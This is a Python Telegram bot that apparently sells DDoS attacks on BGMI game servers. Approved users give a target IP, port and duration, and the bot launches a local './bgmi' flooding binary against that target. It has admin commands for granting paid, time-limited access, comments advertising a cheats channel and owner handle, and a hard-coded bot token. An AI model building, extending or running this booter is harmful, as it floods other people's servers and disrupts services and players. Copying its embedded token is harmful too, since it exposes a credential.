import telebot
import logging
import subprocess
import json
from datetime import datetime, timedelta
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Bot Token and Other Configurations
TOKEN = '7247641708:AAH3bb3q1cUuNRggwGfrYIxL9E5aXkRW3uc'
CHANNEL_ID = -7425292113
ADMIN_IDS = [7425292113]
USER_DATA_FILE = 'users.json'

bot = telebot.TeleBot(TOKEN)
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
user_attack_details = {}
active_attacks = {}

def load_user_data():
    try:
        with open(USER_DATA_FILE, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_user_data(data):
    with open(USER_DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)

user_data = load_user_data()

def run_attack_command_sync(user_id, target_ip, target_port, attack_time, action):
    try:
        if action == 1:  # Start the attack  JOIN :- @DARKCHEATSBGMI OWNER:- @Bgmi_owner_420
            process = subprocess.Popen(
                ["./bgmi", target_ip, str(target_port), str(attack_time), "50"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            active_attacks[(user_id, target_ip, target_port)] = process
            logging.info(f"Attack started for user {user_id} on {target_ip}:{target_port} for {attack_time} seconds")
        elif action == 2:  # Stop the attack
            process = active_attacks.pop((user_id, target_ip, target_port), None)
            if process and process.poll() is None:
                process.terminate()
                process.wait()
                logging.info(f"Attack stopped for user {user_id} on {target_ip}:{target_port}")
            else:
                logging.warning(f"No running attack found for user {user_id} on {target_ip}:{target_port}")
    except Exception as e:
        logging.error(f"Error in run_attack_command_sync: {e}")

def is_user_admin(user_id, chat_id):
    try:
        chat_member = bot.get_chat_member(chat_id, user_id)
        return chat_member.status in ['administrator', 'creator'] or user_id in ADMIN_IDS
    except Exception as e:
        logging.error(f"Error checking admin status: {e}")
        return False

def check_user_approval(user_id):
    try:
        if str(user_id) in user_data and user_data[str(user_id)]['plan'] > 0:
            valid_until = user_data[str(user_id)].get('valid_until', "") #OWNER:- @Bgmi_owner_420
            return valid_until == "" or datetime.now().date() <= datetime.fromisoformat(valid_until).date()
        return False
    except Exception as e:
        logging.error(f"Error in checking user approval: {e}")
        return False

def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')

def send_main_buttons(chat_id):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    markup.add(KeyboardButton("Start Attack 🚀"), KeyboardButton("Stop Attack"))
    bot.send_message(chat_id, "*Choose an action:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['approve'])
def approve_user(message):
    if not is_user_admin(message.from_user.id, message.chat.id):
        bot.send_message(message.chat.id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    try:
        cmd_parts = message.text.split()
        if len(cmd_parts) != 4:
            bot.send_message(message.chat.id, "*Invalid command format. Use /approve <user_id> <plan> <days>*", parse_mode='Markdown')
            return

        target_user_id = int(cmd_parts[1])
        plan = int(cmd_parts[2])
        days = int(cmd_parts[3])

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else ""
        user_data[str(target_user_id)] = {
            "plan": plan,
            "valid_until": valid_until,
            "access_count": 0
        }
        save_user_data(user_data)#OWNER:- @Bgmi_owner_420
        bot.send_message(message.chat.id, f"*User {target_user_id} approved with plan {plan} for {days} days.*", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(message.chat.id, "*Error approving user*", parse_mode='Markdown')
        logging.error(f"Error in approving user: {e}")

@bot.message_handler(func=lambda message: message.text == "Start Attack 🚀")
def attack_button_handler(message):
    if not check_user_approval(message.from_user.id):
        send_not_approved_message(message.chat.id)
        return

    bot.send_message(message.chat.id, "*Please provide the target IP and port separated by a space.*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_ip_port)

def process_attack_ip_port(message):
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.send_message(message.chat.id, "*Invalid format. Provide both target IP and port.*", parse_mode='Markdown')
            return

        target_ip, target_port = args[0], int(args[1])
        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Use another port.*", parse_mode='Markdown')
            return

        user_attack_details[message.from_user.id] = (target_ip, target_port)
        bot.send_message(message.chat.id, "*Please provide the attack time in seconds.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_time)
    except Exception as e:
        logging.error(f"Error in processing attack IP and port: {e}")
        bot.send_message(message.chat.id, "*Something went wrong. Please try again.*", parse_mode='Markdown')
#OWNER:- @Bgmi_owner_420
def process_attack_time(message):
    try:
        attack_time = int(message.text)
        if attack_time <= 0:
            bot.send_message(message.chat.id, "*Invalid time. Time must be greater than 0 seconds.*", parse_mode='Markdown')
            return

        attack_details = user_attack_details.get(message.from_user.id)
        if attack_details:
            target_ip, target_port = attack_details
            run_attack_command_sync(message.from_user.id, target_ip, target_port, attack_time, 1)
            bot.send_message(message.chat.id, f"*Attack started on Host: {target_ip} Port: {target_port} for {attack_time} seconds*", parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, "*No target specified. Use /Attack to set it up.*", parse_mode='Markdown')
    except ValueError:
        bot.send_message(message.chat.id, "*Invalid input. Please enter a valid time in seconds.*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in processing attack time: {e}")
        bot.send_message(message.chat.id, "*Something went wrong. Please try again.*", parse_mode='Markdown')
   #OWNER:- @Bgmi_owner_420
@bot.message_handler(func=lambda message: message.text == "Stop Attack")
def stop_attack(message):
    attack_details = user_attack_details.get(message.from_user.id)
    if attack_details:
        target_ip, target_port = attack_details
        run_attack_command_sync(message.from_user.id, target_ip, target_port, 0, 2)  # Stop attack
        bot.send_message(message.chat.id, f"*Attack stopped on Host: {target_ip} Port: {target_port}*", parse_mode='Markdown')
        user_attack_details.pop(message.from_user.id, None)  # Remove after stopping
    else:
        bot.send_message(message.chat.id, "*No active attack found to stop.*", parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_command(message):
    send_main_buttons(message.chat.id)

if __name__ == "__main__":
    logging.info("Starting bot...")
    bot.polling(none_stop=True)
    